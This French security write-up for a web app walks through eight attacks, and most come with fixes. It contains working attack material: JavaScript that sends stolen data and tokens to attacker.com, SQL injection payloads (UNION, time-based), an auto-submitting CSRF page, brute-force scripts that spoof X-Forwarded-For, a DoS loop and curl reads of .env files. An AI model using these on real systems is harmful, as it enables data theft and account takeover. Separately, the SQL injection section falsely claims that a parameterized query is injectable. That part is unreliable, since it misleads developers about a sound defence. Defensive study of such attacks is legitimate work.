# 🎯 EXEMPLES D'ATTAQUES CONCRETS - PENSEZ COMME UN ATTAQUANT

Ce document montre comment les vulnérabilités pourraient être exploitées en pratique.

---

## 1️⃣ CORS Trop Permissif - Vol de Données Sensibles

### Scénario d'Attaque

**Attacker Domain:** `attacker.com` (hébergé par pirate)  
**Target:** Votre app `app.example.com`

**Étape 1: Page Malveillante sur attacker.com**
```html
<!-- attacker.com/steal-data.html -->
<!DOCTYPE html>
<html>
<body>
<h1>Vérifiez vos offres TAO</h1>
<p>Un moment, chargement en cours...</p>

<script>
// Attaquant profite du CORS permissif
fetch('https://app.example.com/api/projects', {
  credentials: 'include'  // Envoyer les cookies auth!
})
.then(r => r.json())
.then(data => {
  // 🚨 Attaquant a accès à TOUS les projets!
  console.log('Projets volés:', data);
  
  // Envoyer au serveur de l'attaquant
  fetch('https://attacker.com/collect', {
    method: 'POST',
    body: JSON.stringify(data)
  });
});
</script>
</body>
</html>
```

**Étape 2: Invite l'utilisateur**
```
Email au client: "Cliquez ici pour vérifier vos offres"
→ Lien vers attacker.com/steal-data.html
→ Page se charge silencieusement dans background
→ Données sensibles exfiltrées
```

**Impact:**
- ✗ Attaquant peut voir TOUS les projets
- ✗ Peut récupérer les offres concurrentes
- ✗ Extorquer les entreprises ("Donnez-nous des contrats ou on expose vos prix")

**Pourquoi ça marche:**
```javascript
// ACTUELLEMENT en production
if (process.env.RENDER || process.env.NODE_ENV === 'production') {
  return callback(null, true); // ✅ CORS autorisé depuis ANYWHERE!
}

// Attacker obtient:
Access-Control-Allow-Origin: attacker.com  ← MAUVAIS!
```

---

## 2️⃣ SQL Injection - Accès Complet à la Base de Données

### Scénario d'Attaque

**Objectif:** Récupérer TOUS les users, changer un rôle, supprimer les données

**Étape 1: Trouver endpoint vulnérable**
```bash
# Scanner tous les endpoints avec ID
GET /api/projects/123
GET /api/lots/456
GET /api/exports/summary/789  ← Trouvé!
```

**Étape 2: Test SQL injection**
```bash
# Test basique
curl "https://app.example.com/api/exports/summary/1' OR '1'='1"

# Réponse: EXPOSE TOUS les exports au lieu de celui avec ID=1
# Parce que la requête devient:
# SELECT * FROM rounds WHERE id = 1' OR '1'='1'
# La condition '1'='1' est toujours vraie!
```

**Étape 3: Attaque Union-based**
```bash
# Fusionner avec autre table
curl "https://app.example.com/api/exports/summary/1 UNION SELECT email,password_hash FROM users--"

# Si mal configuré, peut retourner emails + password hashes!
```

**Étape 4: Attaque Blind (Time-based)**
```bash
# Si error messages sont supprimés
curl "https://app.example.com/api/exports/summary/1 AND (SELECT COUNT(*) FROM users) > 0 AND SLEEP(5)--"

# Si réponse prend 5 secondes → condition vraie
# Peut inférer données bit-à-bit!
```

**Impact:**
- ✗ Attacker liste TOUS les users
- ✗ Récupère password hashes
- ✗ Craque les mots de passe
- ✗ Accès admin

**Pourquoi ça marche:**
```javascript
// ACTUELLEMENT - Pas de validation
router.get('/summary/:roundId', async (req, res) => {
  const { roundId } = req.params;  // Pas vérifié!
  await query(
    `SELECT * FROM rounds WHERE id = $1`,
    [roundId]  // Si roundId = "1' OR '1'='1", elle passe!
  );
});
```

**FIX:**
```javascript
// AVEC validation
import { validateNumericId } from '../middleware.security-fixes.js';

router.get('/summary/:roundId', validateNumericId('roundId'), async (req, res) => {
  const roundId = parseInt(req.params.roundId, 10);
  if (isNaN(roundId)) return res.status(400).json({ error: 'Invalid' });
  // Maintenant c'est sûr - PostgreSQL le traite comme NUMBER
  await query(`SELECT * FROM rounds WHERE id = $1`, [roundId]);
});
```

---

## 3️⃣ Token Hijacking - Session Permanente de 7 Jours

### Scénario d'Attaque

**Objectif:** Garder accès même après que l'utilisateur se déconnecte

**Étape 1: Voler le token (XSS ou MITM)**
```javascript
// Via XSS dans page (ex: comment injection)
const token = localStorage.getItem('auth');
// OU via cookie si pas HttpOnly
const token = document.cookie.split('auth=')[1];

// Envoyer au serveur attacker
fetch('https://attacker.com/capture?token=' + token);
```

**Étape 2: Réutiliser le token**
```bash
# Attacker fait:
curl -H "Authorization: Bearer STOLEN_TOKEN" \
     https://app.example.com/api/projects

# 🚨 Ça marche! Token n'a pas été révoqué
```

**Étape 3: Maintenir accès 7 jours**
```javascript
// Token valide jusqu'à 7 jours!
jwt.sign(user, JWT_SECRET, { expiresIn: '7d' });

// Même si victime se logout et change son mot de passe,
// l'attacker garde accès pendant 7 jours!
```

**Impact:**
- ✗ Attacker accède comme l'utilisateur pendant 7 jours
- ✗ Peut voir/modifier/exporter données sensibles
- ✗ Aucun moyen pour la victime d'invalider le token
- ✗ Pas d'audit trail (on ne sait pas que token était volé)

**Pourquoi ça marche:**
```javascript
// ACTUELLEMENT - Pas de blacklist
export function requireAuth(req, res, next) {
  const token = header.slice(7);
  jwt.verify(token, JWT_SECRET);
  // ✗ Pas de vérification si token a été révoqué!
  req.user = payload;
  next();
}
```

**FIX:**
```javascript
// AVEC token blacklist
import { tokenBlacklist } from '../middleware.security-fixes.js';

export function requireAuth(req, res, next) {
  const token = header.slice(7);
  
  // Vérifier blacklist
  if (tokenBlacklist.isRevoked(token)) {
    return res.status(401).json({ error: 'Token revoked' });
  }
  
  jwt.verify(token, JWT_SECRET);
  req.user = payload;
  req.token = token; // Pour revocation au logout
  next();
}

// Au logout:
router.post('/logout', requireAuth, (req, res) => {
  const decoded = jwt.decode(req.token);
  tokenBlacklist.revoke(req.token, decoded.exp * 1000);
  // Maintenant token invalide immédiatement
  res.json({ ok: true });
});
```

---

## 4️⃣ CSRF - Modification Non Autorisée

### Scénario d'Attaque

**Objectif:** Forcer un utilisateur à réinitialiser le mot de passe de l'admin

**Étape 1: Attacker crée page malveillante**
```html
<!-- attacker.com/csrf.html -->
<html>
<body>
<img src="https://app.example.com/api/users/1/reset-password?password=attacker123" />
<!-- OU Form caché -->
<form method="POST" action="https://app.example.com/api/users/1/reset-password" style="display:none">
  <input name="password" value="attacker123">
  <input type="submit">
</form>
<script>document.forms[0].submit();</script>
</body>
</html>
```

**Étape 2: Admin clique sur lien (piégé)**
```
Email: "Important security update - click here"
→ Ouvre https://attacker.com/csrf.html
→ Navigateur envoie requête POST simultanément
→ Admin est connecté, donc cookie auth est envoyé
→ Serveur exécute le reset (pas de vérification CSRF!)
```

**Étape 3: Attacker peut se connecter comme admin**
```bash
curl -X POST https://app.example.com/api/auth/login \
  -d '{"email":"admin@company.com","password":"attacker123"}'
# ✓ Login réussi!
```

**Impact:**
- ✗ Admin compromise
- ✗ Accès complet à l'application
- ✗ Peut changer tous les permissions
- ✗ Exporter toutes les données

**Pourquoi ça marche:**
```javascript
// ACTUELLEMENT - Pas de CSRF token
router.post('/users/:id/reset-password', async (req, res) => {
  // ✗ Pas de vérification d'origine
  // ✗ Pas de CSRF token
  // ✗ Accepte n'importe quelle source!
  const password = req.body.password;
  // Update password
});
```

**FIX:**
```javascript
// AVEC CSRF protection
import { validateCsrfToken } from '../middleware.security-fixes.js';

// Avant d'exécuter, obtenir token CSRF
router.get('/csrf-token', (req, res) => {
  res.json({ csrfToken: generateCsrfToken(req.user.id) });
});

// Valider CSRF sur mutations
router.post('/users/:id/reset-password', validateCsrfToken, async (req, res) => {
  // ✓ CSRF token doit être valide
  // ✓ Attacker ne peut pas forcer reset sans token
  const password = req.body.password;
  // Update password
});
```

---

## 5️⃣ Énumération d'Utilisateurs - Information Disclosure

### Scénario d'Attaque

**Objectif:** Découvrir quels emails existent dans le système

**Étape 1: Test registration**
```bash
# Tentative 1
curl -X POST https://app.example.com/api/auth/register \
  -d '{"email":"boss@company.com","password":"pass"}'

# Réponse 1: "Cet email est déjà utilisé" ← Email existe!
# Réponse 2: "Compte créé" ← Email n'existe pas

# Attacker maintenant sait exactement quels emails existent
```

**Étape 2: Attaque par wordlist**
```bash
for email in $(cat fortune500-emails.txt); do
  response=$(curl -s -X POST .../register \
    -d "{\"email\":\"$email\",\"password\":\"x\"}")
  
  if echo "$response" | grep "déjà utilisé"; then
    echo "$email EXISTS" >> discovered-emails.txt
  fi
done

# Résultat: Liste complète des users du système
```

**Étape 3: Attaque de brute-force ciblée**
```bash
# Maintenant on sait quels emails tester
for email in $(cat discovered-emails.txt); do
  for password in $(cat common-passwords.txt); do
    curl -X POST .../login \
      -d "{\"email\":\"$email\",\"password\":\"$password\"}"
  done
done

# Possibilité de cracker mot de passe faible
```

**Impact:**
- ✗ Liste complète des utilisateurs divulguée
- ✗ Base pour attaques de brute-force
- ✗ Information sur structure de l'entreprise (emails)

**Pourquoi ça marche:**
```javascript
// ACTUELLEMENT - Messages d'erreur trop spécifiques
if (existing.rowCount > 0) {
  return res.status(409).json({ 
    error: 'Cet email est déjà utilisé'  // ✗ Révèle que email existe!
  });
}
```

**FIX:**
```javascript
// AVEC messages génériques
try {
  const result = await query(
    'INSERT INTO users (...) VALUES (...)',
    [email, ...]
  );
  res.json({ success: true });
} catch (err) {
  if (err.code === '23505') { // Duplicate
    // ✓ Message générique - attacker ne sait pas si c'est email ou autre
    return res.status(400).json({ 
      error: 'Une erreur est survenue. Si vous avez un compte, utilisez login.' 
    });
  }
  return res.status(500).json({ error: 'Erreur serveur' });
}
```

---

## 6️⃣ Brute Force - Casser le Mot de Passe

### Scénario d'Attaque

**Avec rate limiting INSUFFISANT (20 tentatives/5min):**

```bash
#!/bin/bash
# Attacker script

PASSWORDS=(
  "password123"
  "123456789"
  "letmein"
  "qwerty"
  "admin"
  "company2024"
  # ... 10000 common passwords
)

for pass in "${PASSWORDS[@]}"; do
  curl -X POST https://app.example.com/api/auth/login \
    -d "{\"email\":\"target@company.com\",\"password\":\"$pass\"}" \
    -H "X-Forwarded-For: $(shuf -i 1-255 -n 4 | paste -sd '.' -).com"
    # Change IP à chaque tentative pour contourner rate limiting par IP
done

# Si mot de passe faible (ex: "company2024"), attacker gagne accès
```

**Impact:**
- ✗ Accès non autorisé au compte
- ✗ Peut voir data sensible
- ✗ Peut faire modifications
- ✗ Peut créer compte backup admin

---

## 7️⃣ DoS par Export Massif

### Scénario d'Attaque

**Objectif:** Crasher le serveur avec exports simultanés énormes

```bash
#!/bin/bash
# DoS attack

for i in {1..100}; do
  curl "https://app.example.com/api/exports/summary/$i" \
    -o file$i.xlsx &
done
wait

# Résultat:
# - CPU: 100%
# - Mémoire: Overflow OOM
# - Serveur crash
# - Service down pour tous les utilisateurs
```

**Impact:**
- ✗ Application indisponible (SLA breach)
- ✗ Clients ne peuvent pas accéder
- ✗ Réputation endommagée
- ✗ Perte de revenus

**FIX:**
```javascript
// AVEC rate limiting
import { exportLimiter } from '../middleware.security-fixes.js';

router.get('/summary/:roundId', exportLimiter, async (req, res) => {
  // ✓ Max 3 exports par minute par utilisateur
  // ✓ Déploiement échelonné empêche DoS
});
```

---

## 8️⃣ Lecture de Fichiers Sensibles

### Scénario d'Attaque

```bash
# Attacker essaie d'accéder à fichiers sensibles

# 1. Fichier .env
curl https://app.example.com/.env
# Peut retourner: DATABASE_URL, JWT_SECRET, EMAIL_PASS

# 2. Fichier backup
curl https://app.example.com/database.sql.backup

# 3. Fichier config
curl https://app.example.com/config.json

# 4. Source maps (pour développement)
curl https://app.example.com/app.js.map
```

**FIX:**
```javascript
// DANS nginx.conf
location ~ /\. {
  deny all;  # ✓ Bloquer fichiers cachés
}

location ~ \.sql$ {
  deny all;  # ✓ Bloquer fichiers SQL
}

location ~ \.env {
  deny all;  # ✓ Bloquer fichiers .env
}
```

---

## 🛡️ RÉSUMÉ DES ATTAQUES

| Attaque | Effort | Impact | Risque | Fix Time |
|---|---|---|---|---|
| CORS | ⚪ Très facile | 🔴 Critique | ⬆️⬆️⬆️ | 30 min |
| SQL Injection | ⚪ Très facile | 🔴 Critique | ⬆️⬆️⬆️ | 2 h |
| Token Hijacking | 🟡 Moyen | 🔴 Critique | ⬆️⬆️ | 2 h |
| CSRF | ⚪ Facile | 🟠 Majeur | ⬆️⬆️ | 1 h |
| Enum Users | ⚪ Facile | 🟡 Mineur | ⬆️ | 1 h |
| Brute Force | 🟡 Moyen | 🟠 Majeur | ⬆️⬆️ | 1 h |
| DoS Export | ⚪ Facile | 🟠 Majeur | ⬆️⬆️ | 30 min |
| File Read | ⚪ Très facile | 🔴 Critique | ⬆️⬆️⬆️ | 30 min |

---

## 🧠 Pensée d'Attaquant

**Questions que se pose un attaquant:**

1. **Où sont les inputs non validés?** → SQL injection, XSS
2. **Peut-on contourner l'authentification?** → CSRF, Token expiration
3. **Y a-t-il des rate limits?** → Brute force, DoS
4. **Les secrets sont-ils visibles?** → .env, logs, errors
5. **Les fichiers peuvent-ils être listés?** → Directory traversal
6. **Les IDs sont-ils séquentiels?** → Énumération
7. **Les messages d'erreur révèlent de l'info?** → User enumeration

---

**Leçon:** Si vous pensez comme attaquant, vous corrigez les failles avant qu'elles ne soient exploitées!

